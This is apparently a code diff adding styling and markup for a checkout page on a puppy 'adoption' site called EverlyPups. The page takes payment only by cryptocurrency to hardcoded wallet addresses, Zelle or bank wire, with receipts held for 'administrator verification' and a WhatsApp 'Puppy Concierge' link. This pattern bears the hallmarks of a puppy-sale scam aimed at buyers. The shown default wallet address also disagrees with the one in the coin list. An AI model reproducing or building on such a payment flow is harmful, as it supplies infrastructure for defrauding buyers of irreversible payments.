+      padding: 0 0.75rem !important;
+      font-family: 'Courier New', Courier, monospace !important;
+      font-size: 0.775rem !important;
+      font-weight: 700 !important;
+      color: #1E293B !important;
+      word-break: break-all !important;
+      overflow: hidden !important;
+      text-overflow: ellipsis !important;
+      white-space: nowrap !important;
+      text-align: left !important;
+    }
+
+    .btn-modal-copy {
+      background: none !important;
+      border: none !important;
+      border-left: 1px solid #E2E8F0 !important;
+      width: 38px !important;
+      height: 100% !important;
+      color: var(--brand-primary) !important;
+      cursor: pointer !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      transition: background-color 0.15s ease !important;
+    }
+
+    .btn-modal-copy:hover {
+      background-color: #F1F5F9 !important;
+    }
+
+    .modal-instruction {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.775rem !important;
+      color: var(--text-muted) !important;
+      margin: 0.6rem 0 0.85rem 0 !important;
+      line-height: 1.4 !important;
+    }
+
+    .modal-warning {
+      display: flex !important;
+      gap: 0.5rem !important;
+      align-items: flex-start !important;
+      background-color: #FFF5F5 !important;
+      border: 1px solid #FEE2E2 !important;
+      border-radius: 8px !important;
+      padding: 0.65rem !important;
+      text-align: left !important;
+      box-sizing: border-box !important;
+    }
+
+    .modal-warning i {
+      color: #EF4444 !important;
+      font-size: 0.85rem !important;
+      margin-top: 0.1rem !important;
+      flex-shrink: 0 !important;
+    }
+
+    .modal-warning span {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.725rem !important;
+      color: #991B1B !important;
+      line-height: 1.35 !important;
+    }
+
+    .modal-footer {
+      padding: 0.85rem 1.25rem !important;
+      border-top: 1px solid #F1F5F9 !important;
+      display: flex !important;
+      gap: 0.65rem !important;
+      justify-content: flex-end !important;
+      box-sizing: border-box !important;
+      background-color: #F8FAFC !important;
+    }
+
+    .btn-secondary-action {
+      background-color: #ffffff !important;
+      border: 1px solid #CBD5E1 !important;
+      color: #475569 !important;
+      border-radius: 99px !important;
+      padding: 0.5rem 1.15rem !important;
+      font-family: 'Inter', sans-serif !important;
+      font-weight: 700 !important;
+      font-size: 0.8rem !important;
+      cursor: pointer !important;
+      transition: var(--transition-smooth) !important;
+    }
+
+    .btn-secondary-action:hover {
+      background-color: #F8FAFC !important;
+      border-color: #94A3B8 !important;
+    }
+
+    /* Drag and drop upload area styling */
+    .drag-drop-area {
+      border: 2px dashed #CBD5E1 !important;
+      border-radius: 8px !important;
+      padding: 1.5rem !important;
+      text-align: center !important;
+      cursor: pointer !important;
+      transition: var(--transition-smooth) !important;
+      background-color: #FAFAFA !important;
+      user-select: none !important;
+    }
+    .drag-drop-area:hover {
+      border-color: var(--brand-primary) !important;
+      background-color: #F4FBF7 !important;
+    }
+    .drag-drop-area.dragover {
+      border-color: var(--brand-primary) !important;
+      background-color: #E6F7ED !important;
+    }
+    .btn-remove-file {
+      background: none !important;
+      border: none !important;
+      color: #EF4444 !important;
+      cursor: pointer !important;
+      padding: 0.25rem !important;
+      font-size: 0.95rem !important;
+      transition: color 0.15s ease !important;
+    }
+    .btn-remove-file:hover {
+      color: #DC2626 !important;
+    }
+
+    /* ==========================================================================
+       7. Responsive Layout Media Queries
+       ========================================================================== */
+    @media (max-width: 1024px) {
+      .checkout-grid {
+        display: flex !important;
+        flex-direction: column !important;
+        gap: 0 !important;
+      }
+
+      /* Stack sequence logic */
+      .page-header { order: 1 !important; margin-bottom: 1.25rem !important; }
+      .method-selector { order: 2 !important; margin-bottom: 1.25rem !important; }
+      .active-method-container { order: 3 !important; margin-bottom: 1.25rem !important; }
+      .payment-progress { order: 4 !important; margin-bottom: 1.5rem !important; }
+      .order-summary { order: 5 !important; position: static !important; margin-bottom: 1.5rem !important; }
+      .trust-info { order: 6 !important; margin-bottom: 2.5rem !important; }
+      
+      .sticky-summary-card {
+        position: static !important;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .checkout-header {
+        padding: 1rem 1.5rem !important;
+      }
+      .checkout-section {
+        margin-top: 1.5rem !important;
+      }
+      .payment-method-selector {
+        flex-direction: column !important;
+        gap: 0.65rem !important;
+      }
+      .compact-progress-tracker {
+        flex-direction: column !important;
+        align-items: flex-start !important;
+        gap: 0.65rem !important;
+      }
+      .progress-arrow {
+        display: none !important;
+      }
+      .subtle-trust-row {
+        flex-direction: column !important;
+        gap: 0.85rem !important;
+      }
+      #btnBackToDelivery:hover {
+        background-color: #F8FAFC !important;
+        color: #1E293B !important;
+        border-color: #CBD5E0 !important;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ==========================================================================
+       1. Navigation Header
+       ========================================================================== -->
+  <header class="checkout-header">
+    <a href="index.html" class="checkout-header-logo">
+      <i class="fa-solid fa-paw"></i> EverlyPups
+    </a>
+    
+    <div class="checkout-header-right">
+      <a href="contact.html" class="btn-nav-contact">
+        <i class="fa-solid fa-envelope"></i> Contact Us
+      </a>
+    </div>
+  </header>
+
+  <!-- ==========================================================================
+       2. Re-designed Flat Grid Checkout Main Body
+       ========================================================================== -->
+  <main class="checkout-section">
+    <div class="checkout-grid">
+      
+      <!-- 2.1 PAGE HEADER -->
+      <header class="page-header">
+        <div style="margin-bottom: 1.25rem;">
+          <a href="delivery.html" id="btnBackToDelivery" style="display: inline-flex; align-items: center; gap: 0.35rem; text-decoration: none; font-family: 'Nunito', sans-serif; font-weight: 800; font-size: 0.9rem; color: #4A5568; background-color: #FFFFFF; border: 1px solid #E2E8F0; padding: 0.55rem 1rem; border-radius: 99px; cursor: pointer; transition: all 0.2s ease;">
+            <i class="fa-solid fa-arrow-left" style="font-size: 0.8rem;"></i> Back to Delivery
+          </a>
+        </div>
+        <div class="payment-title-group">
+          <h1 class="payment-main-title">Complete Your Payment</h1>
+          <p class="payment-supporting-text">Choose your preferred payment method to complete your puppy adoption.</p>
+        </div>
+      </header>
+
+      <!-- 2.2 PAYMENT METHOD SELECTOR -->
+      <section class="method-selector">
+        <div class="payment-method-selector">
+          
+          <!-- Selector: Crypto -->
+          <div class="selector-card active" id="cardCryptoSelector" onclick="selectPaymentMethod('crypto')">
+            <div class="selector-card-icon">
+              <i class="fa-solid fa-coins"></i>
+            </div>
+            <div class="selector-card-info">
+              <div class="selector-card-title">Cryptocurrency</div>
+              <div class="selector-card-desc">Pay securely using cryptocurrency.</div>
+            </div>
+            <div class="selector-card-radio"></div>
+          </div>
+
+          <!-- Selector: Zelle -->
+          <div class="selector-card" id="cardZelleSelector" onclick="selectPaymentMethod('zelle')">
+            <div class="selector-card-icon">
+              <i class="fa-solid fa-paper-plane"></i>
+            </div>
+            <div class="selector-card-info">
+              <div class="selector-card-title">Zelle</div>
+              <div class="selector-card-desc">Pay through Zelle.</div>
+            </div>
+            <div class="selector-card-radio"></div>
+          </div>
+
+          <!-- Selector: Bank Transfer -->
+          <div class="selector-card" id="cardBankSelector" onclick="selectPaymentMethod('bank')">
+            <div class="selector-card-icon">
+              <i class="fa-solid fa-building-columns"></i>
+            </div>
+            <div class="selector-card-info">
+              <div class="selector-card-title">Bank Transfer</div>
+              <div class="selector-card-desc">Pay using domestic or international bank transfer.</div>
+            </div>
+            <div class="selector-card-radio"></div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- 2.3 ACTIVE PAYMENT METHOD CONTAINER -->
+      <section class="active-method-container">
+        
+        <!-- Cryptocurrency state -->
+        <div class="method-detail-card" id="activeCrypto" style="display: block;">
+          
+          <!-- State 1: Awaiting Payment -->
+          <div id="cryptoAwaitingState" style="display: block;">
+            <div class="card-header">Crypto Payment</div>
+            
+            <div class="crypto-amount-row">
+              <span class="amount-label">Amount Due</span>
+              <span class="amount-value" id="cryptoAmountUsd">$2,497.00 USD</span>
+            </div>
+
+            <div class="crypto-select-group">
+              <label class="crypto-select-label">Select Coin / Token</label>
+              <div class="input-wrapper" style="position: relative;">
+                <div class="custom-select-container" id="coinSelectorContainer">
+                  <div class="custom-select-trigger" id="coinSelectorTrigger">
+                    <span class="custom-select-placeholder selected-val">Bitcoin (BTC)</span>
+                    <i class="fa-solid fa-chevron-down custom-select-arrow"></i>
+                  </div>
+                  <div class="custom-select-dropdown" id="coinSelectorDropdown" style="display: none;">
+                    <div class="custom-select-option selected" data-value="BTC" data-address="bc1przzdxefwz5s0fxza2f454q9l66rhujfp74sduckzyf9nznw6mxes43vg55" data-network="Bitcoin Network" data-rate="60000" data-symbol="BTC" data-qr="images/payment/btc-qr.jpg">Bitcoin (BTC)</div>
+                    <div class="custom-select-option" data-value="ETH" data-address="0x5690a1f629ef5bbadf77fec6be73fde7e03a0fd4" data-network="Ethereum Network" data-rate="3200" data-symbol="ETH" data-qr="images/payment/eth-qr.jpg">Ethereum (ETH)</div>
+                    <div class="custom-select-option" data-value="USDT" data-address="0x5690a1f629ef5bbadf77fec6be73fde7e03a0fd4" data-network="Ethereum Network" data-rate="1" data-symbol="USDT" data-qr="images/payment/usdt-qr.jpg">Tether (USDT)</div>
+                    <div class="custom-select-option" data-value="USDC" data-address="F96mGaCuLiWTpaff3hhKn3GEWvVmQ3mWSL4YVyo3UfQU" data-network="Solana Network" data-rate="1" data-symbol="USDC" data-qr="images/payment/usdc-qr.jpg">USD Coin (USDC)</div>
+                    <div class="custom-select-option" data-value="SOL" data-address="F96mGaCuLiWTpaff3hhKn3GEWvVmQ3mWSL4YVyo3UfQU" data-network="Solana Network" data-rate="150" data-symbol="SOL" data-qr="images/payment/sol-qr.jpg">Solana (SOL)</div>
+                  </div>
+                </div>
+                <input type="hidden" id="selectedCoin" value="BTC" />
+              </div>
+            </div>
+
+            <!-- Coin Details section -->
+            <div class="coin-details-section">
+              <div class="coin-detail-row">
+                <span class="coin-detail-lbl">Amount:</span>
+                <span class="coin-detail-val" id="cryptoAmountCrypto">0.0416 BTC</span>
+              </div>
+              <div class="coin-detail-row">
+                <span class="coin-detail-lbl">Network:</span>
+                <span class="coin-detail-val" id="cryptoNetwork">Bitcoin Network</span>
+              </div>
+              <div class="coin-detail-row">
+                <span class="coin-detail-lbl">Wallet Address:</span>
+                <span class="coin-detail-val address-font" id="cryptoAddress">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span>
+              </div>
+            </div>
+
+            <!-- Live update countdown -->
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: -0.25rem; margin-bottom: 1.25rem; font-family: 'Inter', sans-serif; font-size: 0.725rem; color: var(--text-muted);">
+              <span><i class="fa-solid fa-arrows-rotate" id="rateTimerIcon" style="margin-right: 3px;"></i> Rates update in <span id="rateTimer">30</span>s</span>
+              <a href="#" onclick="triggerManualRateRefresh(event)" style="color: var(--brand-primary); text-decoration: none; font-weight: 700;">Refresh Rates</a>
+            </div>
+
+            <div class="crypto-action-links">
+              <button class="crypto-action-btn" onclick="copyWalletAddress()">
+                <i class="fa-regular fa-copy"></i> Copy Address
+              </button>
+              <button class="crypto-action-btn highlight-btn" onclick="openQrModal()">
+                <i class="fa-solid fa-qrcode"></i> View QR Code
+              </button>
+            </div>
+
+            <button class="btn-primary-action" id="btnSentCrypto" onclick="submitCryptoSent()">
+              I've Made the Payment
+            </button>
+          </div>
+
+          <!-- State 2: Payment Under Review (Verification in Progress) -->
+          <div id="cryptoVerificationState" style="display: none;">
+            <div class="confirmed-wrapper" style="text-align: left !important; background-color: #ffffff !important; border: 1px solid #E2E8F0 !important; padding: 1.5rem !important; border-radius: 16px !important; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05) !important;">
+              <div class="confirmed-header-box" style="align-items: flex-start !important; margin-bottom: 1.25rem !important; display: flex !important; gap: 1rem !important;">
+                <div class="confirmed-badge-circle" style="background-color: #FEF3C7 !important; color: #D97706 !important; width: 44px !important; height: 44px !important; border-radius: 50% !important; display: flex !important; align-items: center !important; justify-content: center !important; font-size: 1.25rem !important; flex-shrink: 0 !important;">
+                  <i class="fa-solid fa-clock-rotate-left"></i>
+                </div>
+                <div class="confirmed-info">
+                  <div class="confirmed-title" style="color: #1E293B !important; font-weight: 800 !important; font-size: 1.25rem !important; line-height: 1.2 !important; margin-bottom: 0.35rem !important;">Administrator verification in progress...</div>
+                  <p class="confirmed-desc" style="color: #475569 !important; margin: 0 !important; font-size: 0.875rem !important; line-height: 1.45 !important; font-family: 'Inter', sans-serif !important;">
+                    Your payment receipt has been submitted and is now awaiting administrator verification. Once your payment has been verified, we’ll send a confirmation email to your inbox with your next steps.
+                  </p>
+                </div>
+              </div>
+
+              <!-- Three-Step Payment Status Indicator -->
+              <div class="payment-timeline" style="margin: 1.5rem 0; padding: 1rem; background-color: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 12px; font-family: 'Inter', sans-serif;">
+                <!-- Step 1: Complete -->
+                <div class="timeline-item" style="display: flex; gap: 0.75rem; margin-bottom: 1.25rem; position: relative;">
+                  <div class="timeline-line" style="position: absolute; left: 10px; top: 20px; height: calc(100% + 4px); width: 2px; background-color: #22C55E;"></div>
+                  <div class="timeline-bullet" style="width: 22px; height: 22px; border-radius: 50%; background-color: #22C55E; color: white; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; z-index: 2; box-shadow: 0 0 0 4px #DCFCE7;">
+                    ✓
+                  </div>
+                  <div class="timeline-content">
+                    <div style="font-weight: 700; color: #1E293B; font-size: 0.85rem; line-height: 1.2;">Payment submitted</div>
+                    <div style="color: #64748B; font-size: 0.75rem; margin-top: 0.15rem; line-height: 1.2;">Your transaction receipt has been received.</div>
+                  </div>
+                </div>
+
+                <!-- Step 2: Active/Pending -->
+                <div class="timeline-item" style="display: flex; gap: 0.75rem; margin-bottom: 1.25rem; position: relative;">
+                  <div class="timeline-line" style="position: absolute; left: 10px; top: 20px; height: calc(100% + 4px); width: 2px; background-color: #E2E8F0;"></div>
+                  <div class="timeline-bullet" style="width: 22px; height: 22px; border-radius: 50%; background-color: #3B82F6; color: white; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; z-index: 2; box-shadow: 0 0 0 4px #DBEAFE;">
+                    <i class="fa-solid fa-spinner fa-spin" style="font-size: 0.65rem;"></i>
+                  </div>
+                  <div class="timeline-content">
+                    <div style="font-weight: 700; color: #1E293B; font-size: 0.85rem; line-height: 1.2;">Administrator verification</div>
+                    <div style="color: #3B82F6; font-size: 0.75rem; margin-top: 0.15rem; line-height: 1.2; font-weight: 600;">Our team is reviewing your payment.</div>
+                  </div>
+                </div>
+
+                <!-- Step 3: Inactive -->
+                <div class="timeline-item" style="display: flex; gap: 0.75rem; margin-bottom: 0;">
+                  <div class="timeline-bullet" style="width: 22px; height: 22px; border-radius: 50%; background-color: #F1F5F9; border: 2px solid #E2E8F0; color: #94A3B8; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; z-index: 2;">
+                    ○
+                  </div>
+                  <div class="timeline-content">
+                    <div style="font-weight: 600; color: #94A3B8; font-size: 0.85rem; line-height: 1.2;">Payment verified</div>
+                    <div style="color: #94A3B8; font-size: 0.75rem; margin-top: 0.15rem; line-height: 1.2;">You’ll receive an email with your next steps once verification is complete.</div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Details Box -->
+              <div class="receipt-section" style="background-color: #F8FAFC !important; border: 1px solid #E2E8F0 !important; border-radius: 12px !important; margin: 1.25rem 0 !important; padding: 1rem !important;">
+                <div class="receipt-row" style="margin-bottom: 0.45rem !important;">
+                  <span class="receipt-lbl" style="color: #64748B !important; font-size: 0.8rem !important;">Token Option</span>
+                  <span class="receipt-val" style="color: #1E293B !important; font-weight: 600 !important; font-size: 0.8rem !important;" id="underReviewToken">Bitcoin (BTC)</span>
+                </div>
+                <div class="receipt-row" style="margin-bottom: 0.45rem !important;">
+                  <span class="receipt-lbl" style="color: #64748B !important; font-size: 0.8rem !important;">Amount Due</span>
+                  <span class="receipt-val" style="color: #1E293B !important; font-weight: 600 !important; font-size: 0.8rem !important;" id="underReviewAmount">$2,497.00</span>
+                </div>
+                <div class="receipt-row" style="margin-bottom: 0.45rem !important;">
+                  <span class="receipt-lbl" style="color: #64748B !important; font-size: 0.8rem !important;">Transaction Hash (TXhash)</span>
+                  <span class="receipt-val address-font" style="color: #1E293B !important; font-weight: 600 !important; font-size: 0.8rem !important;" id="underReviewTxId">0x7f4e...9b12</span>
+                </div>
+                <div class="receipt-row">
+                  <span class="receipt-lbl" style="color: #64748B !important; font-size: 0.8rem !important;">Receipt File</span>
+                  <span class="receipt-val" style="color: #22C55E !important; font-weight: bold !important; font-size: 0.8rem !important;">Submitted ✓</span>
+                </div>
+              </div>
+
+              <!-- Puppy Concierge Section -->
+              <div class="puppy-concierge-section" style="margin-top: 1.5rem; padding: 1.25rem; background-color: #FEF3C7; border: 1px solid #FDE68A; border-radius: 12px; font-family: 'Inter', sans-serif;">
+                <div style="font-weight: 700; color: #78350F; font-size: 0.95rem; margin-bottom: 0.35rem; display: flex; align-items: center; gap: 0.5rem;">
+                  <i class="fa-solid fa-user-tie"></i> Need help while you wait?
+                </div>
+                <p style="color: #92400E; font-size: 0.8rem; margin: 0 0 1rem 0; line-height: 1.45;">
+                  A Puppy Concierge will chat with you soon to help with your adoption and answer any questions you have.
+                </p>
+                <a href="https://wa.me/17124191465?text=Hello%20EverlyPups%2C%20I%20would%20like%20to%20speak%20with%20a%20Puppy%20Concierge%20about%20adopting%20a%20puppy!" target="_blank" rel="noopener noreferrer" class="btn-primary-action" style="display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; text-decoration: none; text-align: center; font-size: 0.85rem; font-weight: 700; padding: 0.75rem 1.25rem; background-color: #D97706; border-color: #D97706; color: white; border-radius: 8px; margin: 0; box-shadow: 0 2px 4px rgba(217, 119, 6, 0.2); width: 100%; box-sizing: border-box;">
+                  <i class="fa-brands fa-whatsapp"></i> Chat with a Puppy Concierge
+                </a>
+              </div>
+
+
+            </div>
+          </div>
+
+          <!-- State 3: Payment Confirmed -->
+          <div id="cryptoConfirmedState" style="display: none;">
+            <div class="confirmed-wrapper" style="text-align: left !important;">
+              <div class="confirmed-header-box">
+                <div class="confirmed-badge-circle">
+                  <i class="fa-solid fa-circle-check"></i>
+                </div>
+                <div class="confirmed-info">
+                  <div class="confirmed-title">Payment Confirmed ✓</div>
+                  <div class="confirmed-desc" style="font-family: 'Inter', sans-serif !important; font-size: 0.85rem !important;">Your cryptocurrency payment has been verified successfully.</div>
+                </div>
+              </div>
+              
+              <hr class="confirmed-divider" />
+              
+              <div class="receipt-section">
+                <div class="receipt-row" style="margin-bottom: 0.45rem !important;">
+                  <span class="receipt-lbl">Transaction Hash (TXhash)</span>
+                  <span class="receipt-val address-font" id="confirmedTxId">0x7f4e...9b12</span>
+                </div>
+                <div class="receipt-row" style="margin-bottom: 0.45rem !important;">
+                  <span class="receipt-lbl">Token</span>
+                  <span class="receipt-val" id="confirmedToken">Bitcoin (BTC)</span>
+                </div>
+                <div class="receipt-row">
+                  <span class="receipt-lbl">Amount</span>
+                  <span class="receipt-val" id="confirmedAmountUsd">$2,497.00</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- State 5: Payment Verification Failed -->
+          <div id="cryptoFailedState" style="display: none;">
+            <div class="confirmed-wrapper" style="text-align: left !important;">
+              <div class="confirmed-header-box" style="align-items: flex-start !important;">
+                <div class="confirmed-badge-circle" style="background-color: #FEE2E2 !important; color: #EF4444 !important;">
+                  <i class="fa-solid fa-circle-xmark"></i>
+                </div>
+                <div class="confirmed-info">
+                  <div class="confirmed-title" style="color: #991B1B !important; font-weight: 800 !important; font-size: 1.15rem !important;">Payment Verification Failed</div>
+                  <p class="confirmed-desc" style="color: #B91C1C !important; margin: 0.15rem 0 0 0 !important; font-size: 0.8rem !important; line-height: 1.35 !important; font-family: 'Inter', sans-serif !important;">
+                    We were unable to verify your cryptocurrency transaction. Please verify that the transaction ID is correct and the transaction has been confirmed on the blockchain.
+                  </p>
+                </div>
+              </div>
+              
+              <hr class="confirmed-divider" />
+              
+              <div class="receipt-section" style="background-color: #FFF5F5 !important; border: 1px solid #FCA5A5 !important; margin-bottom: 1.25rem !important;">
+                <div class="receipt-row" style="margin-bottom: 0.45rem !important;">
+                  <span class="receipt-lbl" style="color: #991B1B !important;">Token</span>
+                  <span class="receipt-val" style="color: #7F1D1D !important;" id="failedToken">Bitcoin (BTC)</span>
+                </div>
+                <div class="receipt-row" style="margin-bottom: 0.45rem !important;">
+                  <span class="receipt-lbl" style="color: #991B1B !important;">Amount</span>
+                  <span class="receipt-val" style="color: #7F1D1D !important;" id="failedAmount">$2,497.00</span>
+                </div>
+                <div class="receipt-row">
+                  <span class="receipt-lbl" style="color: #991B1B !important;">Status</span>
+                  <span class="status-lbl-green" style="color: #EF4444 !important; font-weight: bold !important;">Verification Failed</span>
+                </div>
+              </div>
+
+              <button class="btn-primary-action" onclick="retryCryptoPayment()" style="background-color: #EF4444 !important; box-shadow: 0 4px 16px rgba(239, 68, 68, 0.3) !important;">
+                Try Again / Re-upload Receipt
+              </button>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Zelle state -->
+        <div class="method-detail-card" id="activeZelle" style="display: none;">
+          <!-- State 1: Awaiting Instructions -->
+          <div id="zelleAwaitingState" style="display: block;">
+            <div class="card-header">Zelle Payment</div>
+            
+            <div class="crypto-amount-row">
+              <span class="amount-label">Amount Due</span>
+              <span class="amount-value" id="zelleAmountUsd">$2,497.00</span>
+            </div>
+
+            <div class="how-it-works-title">How it works</div>
+            <div class="steps-flow">
+              <div class="step-flow-item">
+                <div class="step-flow-num">01</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Receive your invoice</div>
+                  <div class="step-flow-desc">Your invoice and Zelle payment instructions will be sent to your email.</div>
+                </div>
+              </div>
+              <div class="step-flow-item">
+                <div class="step-flow-num">02</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Complete payment</div>
+                  <div class="step-flow-desc">Use the payment information provided in your invoice.</div>
+                </div>
+              </div>
+              <div class="step-flow-item">
+                <div class="step-flow-num">03</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Send your receipt</div>
+                  <div class="step-flow-desc">Forward your Zelle payment receipt to our support email.</div>
+                </div>
+              </div>
+              <div class="step-flow-item">
+                <div class="step-flow-num">04</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Payment verification</div>
+                  <div class="step-flow-desc">Our team will verify your payment before delivery is scheduled.</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="info-alert-card">
+              <i class="fa-solid fa-envelope-open-text info-alert-icon-blue"></i>
+              <div class="info-alert-text">
+                <strong>Payment Instructions Sent by Email</strong><br/>
+                For security, Zelle payment details are provided in your invoice after you select this payment method.
+              </div>
+            </div>
+
+            <button class="btn-primary-action" id="btnSentZelle" onclick="submitZelleSent()">
+              Send Zelle Instructions
+            </button>
+          </div>
+
+          <!-- State 2: Instructions Sent -->
+          <div id="zelleSentState" style="display: none;">
+            <div class="instructions-sent-wrapper">
+              <div class="confirmed-header-box">
+                <div class="confirmed-badge-circle" style="background-color: #FEF3C7 !important; color: #D97706 !important;">
+                  <i class="fa-regular fa-envelope"></i>
+                </div>
+                <div class="confirmed-info">
+                  <div class="confirmed-title" style="color: #92400E !important;">Payment Instructions Sent</div>
+                  <div class="confirmed-desc" style="color: #B45309 !important;">Your invoice and Zelle payment instructions have been sent to your email.</div>
+                </div>
+              </div>
+              
+              <hr class="confirmed-divider" />
+              
+              <p class="sent-instruction-body">After completing your payment, forward your receipt to our support email for verification.</p>
+              
+              <div class="sent-status-badge-row">
+                <span class="sent-status-lbl">Status:</span>
+                <span class="sent-status-badge">Awaiting Payment</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Bank Transfer state -->
+        <div class="method-detail-card" id="activeBank" style="display: none;">
+          <!-- State 1: Awaiting Instructions -->
+          <div id="bankAwaitingState" style="display: block;">
+            <div class="card-header">Bank Transfer</div>
+            
+            <div class="crypto-amount-row">
+              <span class="amount-label">Amount Due</span>
+              <span class="amount-value" id="bankAmountUsd">$2,497.00</span>
+            </div>
+
+            <div class="bank-labels-row">
+              <span class="bank-label-tag">Domestic Bank Transfer</span>
+              <span class="bank-label-tag">International Wire Transfer</span>
+            </div>
+
+            <div class="how-it-works-title">How it works</div>
+            <div class="steps-flow">
+              <div class="step-flow-item">
+                <div class="step-flow-num">01</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Receive your invoice</div>
+                  <div class="step-flow-desc">Your invoice and bank account details will be sent to your email.</div>
+                </div>
+              </div>
+              <div class="step-flow-item">
+                <div class="step-flow-num">02</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Complete the transfer</div>
+                  <div class="step-flow-desc">Use the account details provided in your invoice.</div>
+                </div>
+              </div>
+              <div class="step-flow-item">
+                <div class="step-flow-num">03</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Send your receipt</div>
+                  <div class="step-flow-desc">Forward your transfer receipt to our support email.</div>
+                </div>
+              </div>
+              <div class="step-flow-item">
+                <div class="step-flow-num">04</div>
+                <div class="step-flow-text">
+                  <div class="step-flow-heading">Payment verification</div>
+                  <div class="step-flow-desc">Our team will verify your payment before delivery is scheduled.</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="info-alert-card">
+              <i class="fa-solid fa-envelope-open-text info-alert-icon-blue"></i>
+              <div class="info-alert-text">
+                <strong>Payment Instructions Sent by Email</strong><br/>
+                For security, bank account details are provided in your invoice after you select this payment method.
+              </div>
+            </div>
+
+            <button class="btn-primary-action" id="btnSentBank" onclick="submitBankSent()">
+              Send Bank Transfer Instructions
+            </button>
+          </div>
+
+          <!-- State 2: Instructions Sent -->
+          <div id="bankSentState" style="display: none;">
+            <div class="instructions-sent-wrapper">
+              <div class="confirmed-header-box">
+                <div class="confirmed-badge-circle" style="background-color: #FEF3C7 !important; color: #D97706 !important;">
+                  <i class="fa-regular fa-envelope"></i>
+                </div>
+                <div class="confirmed-info">
+                  <div class="confirmed-title" style="color: #92400E !important;">Payment Instructions Sent</div>
+                  <div class="confirmed-desc" style="color: #B45309 !important;">Your invoice and bank transfer details have been sent to your email.</div>
+                </div>
+              </div>
+              
+              <hr class="confirmed-divider" />
+              
+              <p class="sent-instruction-body">After completing your payment, forward your receipt to our support email for verification.</p>
+              
+              <div class="sent-status-badge-row">
+                <span class="sent-status-lbl">Status:</span>
+                <span class="sent-status-badge">Awaiting Payment</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- 2.4 PAYMENT PROGRESS -->
+      <section class="payment-progress">
+        <div class="compact-progress-tracker">
+          <div class="progress-step completed" id="step1">
+            <span class="progress-indicator"><i class="fa-solid fa-check"></i></span>
+            <span class="progress-text">Adoption Approved</span>
+          </div>
+          <div class="progress-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+          
+          <div class="progress-step completed" id="step2">
+            <span class="progress-indicator"><i class="fa-solid fa-check"></i></span>
+            <span class="progress-text">Invoice Sent</span>
+          </div>
+          <div class="progress-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+          
+          <div class="progress-step active" id="step3">
+            <span class="progress-indicator">●</span>
+            <span class="progress-text">Awaiting Payment</span>
+          </div>
+          <div class="progress-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+          
+          <div class="progress-step" id="step4">
+            <span class="progress-indicator">○</span>
+            <span class="progress-text">Payment Verification</span>
+          </div>
+          <div class="progress-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+          
+          <div class="progress-step" id="step5">
+            <span class="progress-indicator">○</span>
+            <span class="progress-text">Delivery Scheduled</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- 2.5 STICKY ORDER SUMMARY (Spans on right on desktop) -->
+      <aside class="order-summary">
+        <div class="sticky-summary-card">
+          <div class="summary-header">Order Summary</div>
+          
+          <div class="summary-puppy-info">
+            <div class="summary-puppy-img-box">
+              <img src="" alt="" id="summaryPuppyPhoto" class="summary-puppy-img" />
+            </div>
+            <div class="summary-puppy-details">
+              <div class="summary-puppy-name" id="summaryPuppyName">Caleb</div>
+              <div class="summary-puppy-breed" id="summaryPuppyBreed">American Shepadoodle</div>
+              <div class="summary-puppy-specs" id="summaryPuppySpecs">Male • 8 weeks</div>
+            </div>
+          </div>
+
+          <hr class="summary-divider" />
+
+          <div class="summary-price-row">
+            <span class="summary-price-label" style="font-weight: 700;">Adoption Price</span>
+            <span class="summary-price-val" id="summaryPuppyPrice" style="font-weight: 700;">$2,497.00</span>
+          </div>
+
+          <hr class="summary-divider" />
+
+          <!-- Summary details list -->
+          <div class="summary-details-list" style="display: flex; flex-direction: column; gap: 0.65rem; margin-bottom: 1rem;">
+            <div style="display: flex; justify-content: space-between; font-size: 0.8rem; font-family: 'Inter', sans-serif;">
+              <span style="color: var(--text-muted); font-weight: 500;">Puppy</span>
+              <span id="summaryDetailPuppyName" style="color: #1E293B; font-weight: 600;">Caleb</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 0.8rem; font-family: 'Inter', sans-serif;">
+              <span style="color: var(--text-muted); font-weight: 500;">Breed</span>
+              <span id="summaryDetailBreed" style="color: #1E293B; font-weight: 600;">American Shepadoodle</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 0.8rem; font-family: 'Inter', sans-serif;">
+              <span style="color: var(--text-muted); font-weight: 500;">Pickup / Delivery</span>
+              <span id="summaryDetailDelivery" style="color: #1E293B; font-weight: 600;">Awaiting selection</span>
+            </div>
+            <div id="summaryDetailLocationRow" style="display: none; flex-direction: column; align-items: flex-start; gap: 0.2rem; font-size: 0.8rem; font-family: 'Inter', sans-serif; padding-top: 0.25rem;">
+              <span style="color: var(--text-muted); font-weight: 500; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em;">Location</span>
